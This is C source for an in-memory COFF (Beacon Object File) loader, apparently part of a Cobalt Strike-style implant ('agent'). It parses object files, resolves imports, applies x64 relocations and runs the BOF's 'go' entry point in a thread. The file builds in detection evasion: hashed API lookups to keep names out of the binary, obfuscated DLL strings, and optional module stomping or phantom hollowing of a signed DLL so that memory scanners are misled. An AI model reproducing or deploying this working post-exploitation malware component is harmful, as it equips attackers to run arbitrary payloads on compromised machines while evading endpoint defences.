/*
 * coff_loader.c — In-memory COFF (Beacon Object File) loader.
 *
 * Parses x64 COFF object files, allocates memory for each section,
 * resolves external symbols (Beacon API + DLL$Function imports),
 * applies relocations, and executes the entry point.
 *
 * Compatible with Cobalt Strike BOF conventions:
 *   - Entry point: void go(char* args, int args_len)
 *   - External imports: __imp_LIBRARY$Function
 *   - Beacon API: __imp_BeaconPrintf, __imp_BeaconOutput, etc.
 */
#include "agent.h"

#if CONFIG_MODULE_STOMP || CONFIG_PHANTOM_HOLLOW
#include "postex_loader.h"
#endif

/* ─── COFF structures ─── */

#pragma pack(push, 1)

typedef struct {
    USHORT Machine;
    USHORT NumberOfSections;
    ULONG  TimeDateStamp;
    ULONG  PointerToSymbolTable;
    ULONG  NumberOfSymbols;
    USHORT SizeOfOptionalHeader;
    USHORT Characteristics;
} COFF_HEADER;

typedef struct {
    char   Name[8];
    ULONG  VirtualSize;
    ULONG  VirtualAddress;
    ULONG  SizeOfRawData;
    ULONG  PointerToRawData;
    ULONG  PointerToRelocations;
    ULONG  PointerToLinenumbers;
    USHORT NumberOfRelocations;
    USHORT NumberOfLinenumbers;
    ULONG  Characteristics;
} COFF_SECTION;

typedef struct {
    union {
        char ShortName[8];
        struct {
            ULONG Zeroes;
            ULONG Offset;
        } Long;
    } Name;
    ULONG  Value;
    SHORT  SectionNumber;
    USHORT Type;
    BYTE   StorageClass;
    BYTE   NumberOfAuxSymbols;
} COFF_SYMBOL;

typedef struct {
    ULONG  VirtualAddress;
    ULONG  SymbolTableIndex;
    USHORT Type;
} COFF_RELOCATION;

#pragma pack(pop)

/* Section characteristic flags */
#define SCNF_CNT_CODE              0x00000020
#define SCNF_CNT_INIT_DATA         0x00000040
#define SCNF_CNT_UNINIT_DATA       0x00000080
#define SCNF_MEM_EXECUTE           0x20000000
#define SCNF_MEM_READ              0x40000000
#define SCNF_MEM_WRITE             0x80000000

/* Relocation types (AMD64) */
#define IMAGE_REL_AMD64_ADDR64     0x0001
#define IMAGE_REL_AMD64_ADDR32NB   0x0003
#define IMAGE_REL_AMD64_REL32      0x0004
#define IMAGE_REL_AMD64_REL32_1    0x0005
#define IMAGE_REL_AMD64_REL32_2    0x0006
#define IMAGE_REL_AMD64_REL32_3    0x0007
#define IMAGE_REL_AMD64_REL32_4    0x0008
#define IMAGE_REL_AMD64_REL32_5    0x0009

/* Symbol storage classes */
#define IMAGE_SYM_CLASS_EXTERNAL   0x02
#define IMAGE_SYM_CLASS_STATIC     0x03

/* COFF machine types */
#define COFF_MACHINE_AMD64         0x8664
#define COFF_MACHINE_I386          0x014C

/* Max sections and symbols we support */
#define MAX_SECTIONS    64
#define MAX_FUNC_TABLE  256

/* ─── Internal state for a loaded COFF ─── */

typedef struct {
    void  *base;        /* VirtualAlloc'd or stomped memory for this section */
    DWORD  size;        /* Allocation size */
    ULONG  chars;       /* Section characteristics */
    HMODULE hStompedMod;  /* Non-NULL → module-stomped DLL (cleanup: FreeLibrary) */
    void   *phantomView;  /* Non-NULL → phantom hollow view (cleanup: postex_release_region) */
} LoadedSection;

typedef struct {
    char    name[256];
    void   *address;
    BOOL    is_indirect;  /* TRUE if we allocated a pointer-to-function */
} ResolvedSymbol;

/* ─── Function pointer table for Beacon API ─── */


/* Beacon API functions — defined in beacon_api.c */
extern void  __cdecl BeaconPrintf(int type, const char *fmt, ...);
extern void  __cdecl BeaconOutput(int type, const char *data, int len);
extern void  __cdecl BeaconDataParse(void *parser, char *buffer, int size);
extern char* __cdecl BeaconDataExtract(void *parser, int *out_size);
extern int   __cdecl BeaconDataInt(void *parser);
extern short __cdecl BeaconDataShort(void *parser);
extern int   __cdecl BeaconDataLength(void *parser);
extern BOOL  __cdecl BeaconIsAdmin(void);
extern void  __cdecl BeaconRevertToken(void);
extern void  __cdecl BeaconUseToken(HANDLE token);
extern void  __cdecl BeaconGetSpawnTo(BOOL x86, char *buffer, int length);

/* Output buffer — shared with beacon_api.c */
extern unsigned char *g_bof_output;
extern int            g_bof_output_len;
extern int            g_bof_output_cap;

/* ─── Symbol resolution ─── */

/*
 * Resolve an external symbol name.
 *
 * Beacon API symbols:  "__imp_BeaconPrintf" → our implementation
 * DLL imports:         "__imp_KERNEL32$VirtualAlloc" → GetProcAddress
 *
 * For __imp_ symbols (indirect calls), we allocate 8 bytes and store the
 * function pointer there, because the COFF code does:
 *   call qword ptr [__imp_KERNEL32$VirtualAlloc]
 * which dereferences a pointer-to-function-pointer.
 */
static BOOL resolve_symbol(const char *name, void **out_addr, BOOL *out_indirect) {
    const char *clean = name;

    /* Strip __imp_ prefix */
    if (strncmp(name, "__imp_", 6) == 0)
        clean = name + 6;

    /* Strip leading underscore (x86 decoration) */
    if (clean[0] == '_' && strncmp(name, "__imp_", 6) != 0)
        clean = clean + 1;

    /* Check Beacon API table via hash — no plaintext API name strings in binary */
    /* DJB2 hash inline */
    DWORD _sym_hash = 5381;
    for (const char *_p = clean; *_p; _p++)
        _sym_hash = ((_sym_hash << 5) + _sym_hash) + (unsigned char)*_p;

    static const struct { DWORD hash; void *addr; } _bapi[] = {
        { 0x700D8660, (void*)BeaconPrintf },
        { 0x6DF4B81E, (void*)BeaconOutput },
        { 0xE2494BA2, (void*)BeaconDataParse },
        { 0x80D46722, (void*)BeaconDataExtract },
        { 0xAF1AFDD2, (void*)BeaconDataInt },
        { 0xE2835EF7, (void*)BeaconDataShort },
        { 0x22641D29, (void*)BeaconDataLength },
        { 0x566264D2, (void*)BeaconIsAdmin },
        { 0xF2744BA6, (void*)BeaconRevertToken },
        { 0x889E48BB, (void*)BeaconUseToken },
        { 0x1E7C9FB9, (void*)BeaconGetSpawnTo },
        { 0, NULL }
    };

    for (int i = 0; _bapi[i].addr != NULL; i++) {
        if (_sym_hash == _bapi[i].hash) {
            void *func_ptr = _bapi[i].addr;

            /* If original had __imp_ prefix, create indirect pointer */
            if (strncmp(name, "__imp_", 6) == 0) {
                void **indirect = (void**)VirtualAlloc(NULL, sizeof(void*),
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (!indirect) return FALSE;
                *indirect = func_ptr;
                *out_addr = (void*)indirect;
                *out_indirect = TRUE;
            } else {
                *out_addr = func_ptr;
                *out_indirect = FALSE;
            }
            return TRUE;
        }
    }

    /* DLL import: "LIBRARY$Function" convention */
    const char *dollar = strchr(clean, '$');
    if (dollar) {
        char dll_name[128] = {0};
        char func_name[128] = {0};
        int dll_len = (int)(dollar - clean);

        if (dll_len >= (int)sizeof(dll_name)) dll_len = sizeof(dll_name) - 1;
        memcpy(dll_name, clean, dll_len);
        dll_name[dll_len] = '\0';

        strncpy(func_name, dollar + 1, sizeof(func_name) - 1);

        /* Append .dll if no extension */
        if (!strchr(dll_name, '.')) {
            if (dll_len + 4 < (int)sizeof(dll_name)) {
                strcat(dll_name, ".dll");
            }
        }

        /* Case-insensitive DLL name for LoadLibrary */
        HMODULE hMod = LoadLibraryA(dll_name);
        if (!hMod) {
            /* Try lowercase */
            for (int i = 0; dll_name[i]; i++)
                dll_name[i] = (char)tolower((unsigned char)dll_name[i]);
            hMod = LoadLibraryA(dll_name);
        }
        if (!hMod) return FALSE;

        FARPROC proc = GetProcAddress(hMod, func_name);
        if (!proc) {
            /* Try with 'A' suffix */
            char func_a[132];
            snprintf(func_a, sizeof(func_a), "%sA", func_name);
            proc = GetProcAddress(hMod, func_a);
        }
        if (!proc) {
            /* Try with 'W' suffix */
            char func_w[132];
            snprintf(func_w, sizeof(func_w), "%sW", func_name);
            proc = GetProcAddress(hMod, func_w);
        }
        if (!proc) return FALSE;

        /* For __imp_ symbols, create indirect pointer */
        if (strncmp(name, "__imp_", 6) == 0) {
            void **indirect = (void**)VirtualAlloc(NULL, sizeof(void*),
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!indirect) return FALSE;
            *indirect = (void*)proc;
            *out_addr = (void*)indirect;
            *out_indirect = TRUE;
        } else {
            *out_addr = (void*)proc;
            *out_indirect = FALSE;
        }
        return TRUE;
    }

    /* ─── Fallback: bare CRT function names → msvcrt.dll ─── */
    /* BOFs compiled with MinGW may reference standard C library functions
     * without the MSVCRT$ prefix. Map them to msvcrt.dll automatically. */
    static const char *crt_functions[] = {
        "malloc", "free", "calloc", "realloc",
        "memcpy", "memset", "memcmp", "memmove",
        "strlen", "strcmp", "strncmp", "strcpy", "strncpy", "strcat", "strncat", "strstr",
        "sprintf", "snprintf", "_snprintf", "printf", "sscanf",
        "wcscat", "wcscpy", "wcslen", "wcsncpy", "wcscmp", "wcsncmp",
        "swprintf", "_wcsicmp", "_stricmp", "_snwprintf",
        "atoi", "atol", "strtol", "strtoul",
        "qsort", "bsearch", "abs",
        "tolower", "toupper", "isdigit", "isalpha",
        NULL
    };

    for (int i = 0; crt_functions[i] != NULL; i++) {
        if (strcmp(clean, crt_functions[i]) == 0) {
            char _mc[] = S_MSVCRT_DLL; _DEOBF(_mc);
            HMODULE hMsvcrt = LoadLibraryA(_mc);
            if (!hMsvcrt) return FALSE;

            FARPROC proc = GetProcAddress(hMsvcrt, clean);
            if (!proc) return FALSE;

            if (strncmp(name, "__imp_", 6) == 0) {
                void **indirect = (void**)VirtualAlloc(NULL, sizeof(void*),
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (!indirect) return FALSE;
                *indirect = (void*)proc;
                *out_addr = (void*)indirect;
                *out_indirect = TRUE;
            } else {
                *out_addr = (void*)proc;
                *out_indirect = FALSE;
            }
            return TRUE;
        }
    }

    return FALSE;
}

/* ─── Get symbol name from COFF symbol table ─── */

static const char *get_symbol_name(const COFF_SYMBOL *sym,
                                    const char *string_table,
                                    DWORD string_table_size,
                                    char *buf, int buf_size) {
    if (sym->Name.Long.Zeroes == 0) {
        /* Long name — offset into string table */
        DWORD offset = sym->Name.Long.Offset;
        if (offset < string_table_size) {
            return string_table + offset;
        }
        buf[0] = '\0';
        return buf;
    } else {
        /* Short name — inline, may not be null-terminated */
        int len = 0;
        while (len < 8 && sym->Name.ShortName[len]) len++;
        if (len >= buf_size) len = buf_size - 1;
        memcpy(buf, sym->Name.ShortName, len);
        buf[len] = '\0';
        return buf;
    }
}

/* ─── BOF thread wrapper for crash isolation ─── */

typedef void (__cdecl *BofEntryFunc)(char *args, int args_len);

typedef struct {
    BofEntryFunc entry;
    char        *args;
    int          args_len;
} BOF_THREAD_CTX;

static DWORD WINAPI bof_thread_proc(LPVOID param) {
    BOF_THREAD_CTX *ctx = (BOF_THREAD_CTX *)param;
    ctx->entry(ctx->args, ctx->args_len);
    return 0;
}

/* ─── Main COFF load & execute ─── */

BOOL coff_load_and_execute(
    const unsigned char *coff_data,
    DWORD coff_len,
    const unsigned char *arg_data,
    DWORD arg_len,
    unsigned char **output,
    DWORD *output_len
) {
    /* ─── Pre-declare variables used by cleanup labels ─── */
    LoadedSection loaded[MAX_SECTIONS];
    memset(loaded, 0, sizeof(loaded));
    const COFF_HEADER *hdr = NULL;
    const COFF_SECTION *sections = NULL;
    void **sym_addrs = NULL;
    BOOL *sym_indirect = NULL;
    BOOL *sym_resolved = NULL;

    /* ─── Initialize output buffer EARLY for diagnostics ─── */
    g_bof_output_cap = 4096;
    g_bof_output = (unsigned char *)malloc(g_bof_output_cap);
    g_bof_output_len = 0;
    if (!g_bof_output) {
        if (output) *output = NULL;
        if (output_len) *output_len = 0;
        return FALSE;
    }

    if (!coff_data || coff_len < sizeof(COFF_HEADER)) {
        BeaconPrintf(0x0d, "[!] COFF: invalid data (NULL or too small: %u bytes)\n", coff_len);
        goto cleanup_with_diag;
    }

    /* ─── Step 1: Parse COFF header ─── */
    hdr = (const COFF_HEADER *)coff_data;

    if (hdr->Machine != COFF_MACHINE_AMD64) {
        BeaconPrintf(0x0d, "[!] COFF: bad machine type 0x%04X (expected 0x8664 for x64)\n", hdr->Machine);
        goto cleanup_with_diag;
    }

    if (hdr->NumberOfSections > MAX_SECTIONS) {
        BeaconPrintf(0x0d, "[!] COFF: too many sections: %u (max %d)\n", hdr->NumberOfSections, MAX_SECTIONS);
        goto cleanup_with_diag;
    }

    if (hdr->SizeOfOptionalHeader != 0) {
        BeaconPrintf(0x0d, "[!] COFF: has optional header (size %u) — not an object file\n", hdr->SizeOfOptionalHeader);
        goto cleanup_with_diag;
    }

    /* ─── Step 2: Parse section headers ─── */
    sections = (const COFF_SECTION *)(coff_data + sizeof(COFF_HEADER));

    /* ─── Step 3: Parse symbol table ─── */
    if (hdr->PointerToSymbolTable == 0 || hdr->NumberOfSymbols == 0) {
        BeaconPrintf(0x0d, "[!] COFF: no symbol table (offset=%u, count=%u)\n",
                     hdr->PointerToSymbolTable, hdr->NumberOfSymbols);
        goto cleanup_with_diag;
    }

    const COFF_SYMBOL *sym_table = (const COFF_SYMBOL *)(coff_data + hdr->PointerToSymbolTable);
    DWORD sym_table_end = hdr->PointerToSymbolTable + hdr->NumberOfSymbols * sizeof(COFF_SYMBOL);

    /* String table follows immediately after symbol table */
    const char *string_table = NULL;
    DWORD string_table_size = 0;
    if (sym_table_end + 4 <= coff_len) {
        string_table_size = *(const DWORD *)(coff_data + sym_table_end);
        string_table = (const char *)(coff_data + sym_table_end);
    }

    /* ─── Step 4: Allocate memory for each section ─── */
#if CONFIG_MODULE_STOMP || CONFIG_PHANTOM_HOLLOW
    BOOL text_section_stomped = FALSE;
#endif

    for (int i = 0; i < hdr->NumberOfSections; i++) {
        DWORD alloc_size = sections[i].SizeOfRawData;
        if (sections[i].VirtualSize > alloc_size)
            alloc_size = sections[i].VirtualSize;
        if (alloc_size == 0)
            alloc_size = 1;

        /* ── Module stomping / phantom hollowing for .text sections ──
         * Instead of VirtualAlloc, load a legitimate signed DLL and
         * overwrite its .text section. Memory scanners see the DLL path
         * instead of suspicious VirtualAlloc'd RX memory. */
#if CONFIG_MODULE_STOMP || CONFIG_PHANTOM_HOLLOW
        BOOL this_section_stomped = FALSE;
        if (!text_section_stomped &&
            (sections[i].Characteristics & SCNF_CNT_CODE) &&
            (sections[i].Characteristics & SCNF_MEM_EXECUTE))
        {
            STOMP_REGION stomp;
            if (postex_acquire_region((SIZE_T)alloc_size, &stomp)) {
                loaded[i].base = stomp.base;
                loaded[i].size = (stomp.size > alloc_size) ? stomp.size : alloc_size;
                loaded[i].chars = sections[i].Characteristics;
                loaded[i].hStompedMod = stomp.hMod;
                loaded[i].phantomView = stomp.viewBase;
                text_section_stomped = TRUE;
                this_section_stomped = TRUE;
            }
            /* Fall through to normal VirtualAlloc if stomping failed */
        }
        if (!this_section_stomped)
#endif
        {
            /* Allocate as RW initially — will fix protections later */
            loaded[i].base = VirtualAlloc(NULL, alloc_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!loaded[i].base) {
                BeaconPrintf(0x0d, "[!] COFF: VirtualAlloc failed for section %d (size %u)\n", i, alloc_size);
                goto cleanup_with_diag;
            }

            loaded[i].size = alloc_size;
            loaded[i].chars = sections[i].Characteristics;
        }

        /* Copy section data */
        if (sections[i].SizeOfRawData > 0 && sections[i].PointerToRawData > 0) {
            if (sections[i].PointerToRawData + sections[i].SizeOfRawData > coff_len) {
                BeaconPrintf(0x0d, "[!] COFF: section %d data exceeds file (offset %u + size %u > %u)\n",
                             i, sections[i].PointerToRawData, sections[i].SizeOfRawData, coff_len);
                goto cleanup_with_diag;
            }
            memcpy(loaded[i].base,
                   coff_data + sections[i].PointerToRawData,
                   sections[i].SizeOfRawData);
        }

        /* Zero-fill .bss (uninitialized data) */
        if (sections[i].Characteristics & SCNF_CNT_UNINIT_DATA) {
            memset(loaded[i].base, 0, alloc_size);
        }
    }

    /* ─── Step 5: Resolve external symbols ─── */
    /* Track resolved addresses per symbol index */
    sym_addrs = (void **)calloc(hdr->NumberOfSymbols, sizeof(void*));
    sym_indirect = (BOOL *)calloc(hdr->NumberOfSymbols, sizeof(BOOL));
    sym_resolved = (BOOL *)calloc(hdr->NumberOfSymbols, sizeof(BOOL));
    if (!sym_addrs || !sym_indirect || !sym_resolved) {
        BeaconPrintf(0x0d, "[!] COFF: failed to allocate symbol tracking arrays (%u symbols)\n", hdr->NumberOfSymbols);
        goto cleanup_syms_diag;
    }

    for (DWORD s = 0; s < hdr->NumberOfSymbols; s++) {
        const COFF_SYMBOL *sym = &sym_table[s];

        /* Internal symbols (defined in a section) */
        if (sym->SectionNumber > 0 && sym->SectionNumber <= hdr->NumberOfSections) {
            int sec_idx = sym->SectionNumber - 1;  /* 1-based */
            if (loaded[sec_idx].base) {
                sym_addrs[s] = (void*)((unsigned char*)loaded[sec_idx].base + sym->Value);
                sym_resolved[s] = TRUE;
            }
        }
        /* External symbols (SectionNumber == 0, EXTERNAL class) */
        else if (sym->SectionNumber == 0 && sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL) {
            char name_buf[256];
            const char *name = get_symbol_name(sym, string_table, string_table_size,
                                                name_buf, sizeof(name_buf));
            if (name[0] != '\0') {
                void *addr = NULL;
                BOOL indirect = FALSE;
                if (resolve_symbol(name, &addr, &indirect)) {
                    sym_addrs[s] = addr;
                    sym_indirect[s] = indirect;
                    sym_resolved[s] = TRUE;
                } else {
                    /* Unresolved external — report it */
                    BeaconPrintf(0x0d, "[!] COFF: unresolved symbol: %s\n", name);
                }
            }
        }

        /* Skip auxiliary symbol entries (AFTER processing the main symbol) */
        if (sym->NumberOfAuxSymbols > 0) {
            s += sym->NumberOfAuxSymbols;
        }
    }

    /* ─── Step 6: Apply relocations ─── */
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (sections[i].NumberOfRelocations == 0)
            continue;

        if (!loaded[i].base)
            continue;

        if (sections[i].PointerToRelocations == 0)
            continue;

        const COFF_RELOCATION *relocs = (const COFF_RELOCATION *)
            (coff_data + sections[i].PointerToRelocations);

        for (int r = 0; r < sections[i].NumberOfRelocations; r++) {
            DWORD rva = relocs[r].VirtualAddress;
            DWORD sym_idx = relocs[r].SymbolTableIndex;
            USHORT reloc_type = relocs[r].Type;

            if (sym_idx >= hdr->NumberOfSymbols)
                continue;

            if (!sym_resolved[sym_idx]) {
                /* Unresolved symbol referenced by relocation — fatal */
                char name_buf[256];
                const char *name = get_symbol_name(&sym_table[sym_idx],
                    string_table, string_table_size, name_buf, sizeof(name_buf));
                BeaconPrintf(0x0d, "[!] COFF: relocation in section %d references unresolved symbol [%u]: %s\n",
                             i, sym_idx, name);
                continue;
            }

            void *target_addr = sym_addrs[sym_idx];
            unsigned char *patch_addr = (unsigned char *)loaded[i].base + rva;

            /* Bounds check */
            if (rva >= loaded[i].size)
                continue;

            /*
             * CRITICAL: In COFF object files, the bytes at the relocation
             * site contain an ADDEND — an offset into the target (e.g.,
             * which string within .rdata). We must read it and add it to
             * the target address before computing the final value.
             */
            switch (reloc_type) {
                case IMAGE_REL_AMD64_ADDR64: {
                    /* 64-bit absolute address */
                    INT64 addend;
                    memcpy(&addend, patch_addr, 8);
                    INT64 val = (INT64)(uintptr_t)target_addr + addend;
                    memcpy(patch_addr, &val, 8);
                    break;
                }

                case IMAGE_REL_AMD64_ADDR32NB: {
                    /* 32-bit address without image base (RVA-like) */
                    INT32 addend;
                    memcpy(&addend, patch_addr, 4);
                    INT32 delta = (INT32)((uintptr_t)target_addr + addend -
                                          (uintptr_t)loaded[i].base);
                    memcpy(patch_addr, &delta, 4);
                    break;
                }

                case IMAGE_REL_AMD64_REL32: {
                    /* 32-bit PC-relative. Displacement from (patch_addr + 4) */
                    INT32 addend;
                    memcpy(&addend, patch_addr, 4);
                    INT64 diff = (INT64)((uintptr_t)target_addr + addend -
                                         ((uintptr_t)patch_addr + 4));
                    INT32 rel = (INT32)diff;
                    memcpy(patch_addr, &rel, 4);
                    break;
                }

                case IMAGE_REL_AMD64_REL32_1: {
                    INT32 addend;
                    memcpy(&addend, patch_addr, 4);
                    INT64 diff = (INT64)((uintptr_t)target_addr + addend -
                                         ((uintptr_t)patch_addr + 5));
                    INT32 rel = (INT32)diff;
                    memcpy(patch_addr, &rel, 4);
                    break;
                }

                case IMAGE_REL_AMD64_REL32_2: {
                    INT32 addend;
                    memcpy(&addend, patch_addr, 4);
                    INT64 diff = (INT64)((uintptr_t)target_addr + addend -
                                         ((uintptr_t)patch_addr + 6));
                    INT32 rel = (INT32)diff;
                    memcpy(patch_addr, &rel, 4);
                    break;
                }

                case IMAGE_REL_AMD64_REL32_3: {
                    INT32 addend;
                    memcpy(&addend, patch_addr, 4);
                    INT64 diff = (INT64)((uintptr_t)target_addr + addend -
                                         ((uintptr_t)patch_addr + 7));
                    INT32 rel = (INT32)diff;
                    memcpy(patch_addr, &rel, 4);
                    break;
                }

                case IMAGE_REL_AMD64_REL32_4: {
                    INT32 addend;
                    memcpy(&addend, patch_addr, 4);
                    INT64 diff = (INT64)((uintptr_t)target_addr + addend -
                                         ((uintptr_t)patch_addr + 8));
                    INT32 rel = (INT32)diff;
                    memcpy(patch_addr, &rel, 4);
                    break;
                }

                case IMAGE_REL_AMD64_REL32_5: {
                    INT32 addend;
                    memcpy(&addend, patch_addr, 4);
                    INT64 diff = (INT64)((uintptr_t)target_addr + addend -
                                         ((uintptr_t)patch_addr + 9));
                    INT32 rel = (INT32)diff;
                    memcpy(patch_addr, &rel, 4);
                    break;
                }

                default:
                    /* Unsupported relocation type — skip */
                    break;
            }
        }
    }

    /* ─── Step 7: Set final memory protections ─── */
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (!loaded[i].base) continue;

        DWORD protect;
        BOOL has_exec = (loaded[i].chars & SCNF_MEM_EXECUTE) != 0;
        BOOL has_write = (loaded[i].chars & SCNF_MEM_WRITE) != 0;

        if (has_exec && has_write)
            protect = PAGE_EXECUTE_READWRITE;
        else if (has_exec)
            protect = PAGE_EXECUTE_READ;
        else if (has_write)
            protect = PAGE_READWRITE;
        else
            protect = PAGE_READONLY;

        DWORD old_protect;
        VirtualProtect(loaded[i].base, loaded[i].size, protect, &old_protect);
    }

    /* ─── Step 8: Find entry point ─── */
    BofEntryFunc entry = NULL;
    for (DWORD s = 0; s < hdr->NumberOfSymbols; s++) {
        const COFF_SYMBOL *sym = &sym_table[s];

        if (sym->SectionNumber > 0 && sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL) {
            char name_buf[256];
            const char *name = get_symbol_name(sym, string_table, string_table_size,
                                                name_buf, sizeof(name_buf));

            if (strcmp(name, "go") == 0 || strcmp(name, "_go") == 0) {
                int sec_idx = sym->SectionNumber - 1;
                if (sec_idx >= 0 && sec_idx < hdr->NumberOfSections && loaded[sec_idx].base) {
                    entry = (BofEntryFunc)((unsigned char*)loaded[sec_idx].base + sym->Value);
                }
                break;
            }
        }

        /* Skip aux symbols AFTER checking the main symbol */
        if (sym->NumberOfAuxSymbols > 0) {
            s += sym->NumberOfAuxSymbols;
        }
    }

    if (!entry) {
        BeaconPrintf(0x0d, "[!] COFF: entry point 'go' not found in symbol table (%u symbols scanned)\n",
                     hdr->NumberOfSymbols);
        /* Dump all symbols so operator can see what's in the BOF */
        for (DWORD s = 0; s < hdr->NumberOfSymbols; s++) {
            const COFF_SYMBOL *sym = &sym_table[s];
            if (sym->SectionNumber > 0) {
                char nb[256];
                const char *n = get_symbol_name(sym, string_table, string_table_size, nb, sizeof(nb));
                BeaconPrintf(0x0d, "  [dbg] symbol: '%s' (section %d, class %d, value 0x%X, aux %d)\n",
                             n, sym->SectionNumber, sym->StorageClass, sym->Value, sym->NumberOfAuxSymbols);
            }
            if (sym->NumberOfAuxSymbols > 0)
                s += sym->NumberOfAuxSymbols;
        }
        goto cleanup_syms_diag;
    }

    /* ─── Step 9: Grow output buffer for BOF execution and execute ─── */
    /* Buffer was initialized at the top for diagnostics — grow it now for real output */
    {
        int new_cap = 1024 * 256;  /* 256KB */
        if (g_bof_output_cap < new_cap) {
            unsigned char *new_buf = (unsigned char *)realloc(g_bof_output, new_cap);
            if (!new_buf) {
                BeaconPrintf(0x0d, "[!] COFF: failed to grow output buffer to %d bytes\n", new_cap);
                goto cleanup_syms_diag;
            }
            g_bof_output = new_buf;
            g_bof_output_cap = new_cap;
        }
    }

    /* Call the BOF entry point in a separate thread for crash isolation.
     * If the BOF triggers an access violation or other fatal exception,
     * only the worker thread dies — the agent survives. */
    {
        BOF_THREAD_CTX tctx;
        tctx.entry    = entry;
        tctx.args     = (char *)arg_data;
        tctx.args_len = (int)arg_len;

        HANDLE hThread = CreateThread(NULL, 0, bof_thread_proc, &tctx, 0, NULL);
        if (hThread) {
            DWORD waitRet = WaitForSingleObject(hThread, 300000); /* 5 min timeout */
            DWORD exitCode = 0;
            GetExitCodeThread(hThread, &exitCode);

            if (waitRet == WAIT_TIMEOUT || exitCode == STILL_ACTIVE) {
                /* Timed out — kill the thread */
                TerminateThread(hThread, 1);
                CloseHandle(hThread);
                BeaconPrintf(0x0d, "[!] COFF: BOF timed out after 300s — thread terminated\n");
            } else {
                CloseHandle(hThread);
                if (exitCode != 0) {
                    /* Thread crashed with an exception code */
                    BeaconPrintf(0x0d,
                        "[!] COFF: BOF crashed with exception 0x%08X\n", exitCode);
                }
            }
        } else {
            /* CreateThread failed — fall back to direct call (risky) */
            BeaconPrintf(0x0d, "[!] COFF: CreateThread failed (%u), running BOF inline\n",
                         GetLastError());
            entry((char *)arg_data, (int)arg_len);
        }
    }

    /* ─── Step 10: Collect output and cleanup ─── */
    if (g_bof_output_len > 0 && output && output_len) {
        *output = (unsigned char *)malloc(g_bof_output_len);
        if (*output) {
            memcpy(*output, g_bof_output, g_bof_output_len);
            *output_len = (DWORD)g_bof_output_len;
        }
    } else if (output && output_len) {
        *output = NULL;
        *output_len = 0;
    }

    free(g_bof_output);
    g_bof_output = NULL;
    g_bof_output_len = 0;
    g_bof_output_cap = 0;

    /* Free resolved indirect pointers */
    for (DWORD s = 0; s < hdr->NumberOfSymbols; s++) {
        if (sym_indirect[s] && sym_addrs[s])
            VirtualFree(sym_addrs[s], 0, MEM_RELEASE);
    }
    free(sym_addrs);
    free(sym_indirect);
    free(sym_resolved);

    /* Free loaded sections */
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (!loaded[i].base) continue;

        if (loaded[i].hStompedMod) {
            /* Module stomping: zero memory, FreeLibrary */
            DWORD op;
            VirtualProtect(loaded[i].base, loaded[i].size, PAGE_READWRITE, &op);
            SecureZeroMemory(loaded[i].base, loaded[i].size);
            FreeLibrary(loaded[i].hStompedMod);
        } else if (loaded[i].phantomView) {
            /* Phantom hollow: zero memory, release region */
            STOMP_REGION sr = {0};
            sr.base = loaded[i].base;
            sr.size = loaded[i].size;
            sr.viewBase = loaded[i].phantomView;
            postex_release_region(&sr);
        } else {
            VirtualFree(loaded[i].base, 0, MEM_RELEASE);
        }
    }

    return TRUE;

cleanup_syms_diag:
    if (sym_addrs) {
        for (DWORD s = 0; s < hdr->NumberOfSymbols; s++) {
            if (sym_indirect && sym_indirect[s] && sym_addrs[s])
                VirtualFree(sym_addrs[s], 0, MEM_RELEASE);
        }
        free(sym_addrs);
    }
    if (sym_indirect) free(sym_indirect);
    if (sym_resolved) free(sym_resolved);
    /* Fall through to cleanup_with_diag */

cleanup_with_diag:
    /* Free loaded sections */
    for (int i = 0; i < MAX_SECTIONS; i++) {
        if (!loaded[i].base) continue;

        if (loaded[i].hStompedMod) {
            DWORD op;
            VirtualProtect(loaded[i].base, loaded[i].size, PAGE_READWRITE, &op);
            SecureZeroMemory(loaded[i].base, loaded[i].size);
            FreeLibrary(loaded[i].hStompedMod);
        } else if (loaded[i].phantomView) {
            STOMP_REGION sr = {0};
            sr.base = loaded[i].base;
            sr.size = loaded[i].size;
            sr.viewBase = loaded[i].phantomView;
            postex_release_region(&sr);
        } else {
            VirtualFree(loaded[i].base, 0, MEM_RELEASE);
        }
    }

    /* Return diagnostic output to caller even though we failed */
    if (g_bof_output && g_bof_output_len > 0 && output && output_len) {
        *output = (unsigned char *)malloc(g_bof_output_len);
        if (*output) {
            memcpy(*output, g_bof_output, g_bof_output_len);
            *output_len = (DWORD)g_bof_output_len;
        } else {
            *output = NULL;
            *output_len = 0;
        }
    } else if (output && output_len) {
        *output = NULL;
        *output_len = 0;
    }

    if (g_bof_output) {
        free(g_bof_output);
        g_bof_output = NULL;
        g_bof_output_len = 0;
        g_bof_output_cap = 0;
    }

    return FALSE;
}
